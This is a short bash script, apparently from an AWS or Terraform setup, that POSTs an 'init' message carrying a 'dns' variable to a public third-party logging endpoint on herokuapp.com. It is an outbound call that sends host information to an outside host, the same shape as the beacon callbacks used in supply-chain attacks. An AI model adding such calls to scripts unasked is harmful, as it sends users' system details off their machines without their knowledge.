#!/bin/bash

curl -XPOST 'https://realtimelog.herokuapp.com:443/rkc8q6llprn' \
  -H 'Content-Type: application/json' -d '{
    "tf":"aws.x", "msg": "init", "dns": "'${dns}'","env":"'env'"
  }'
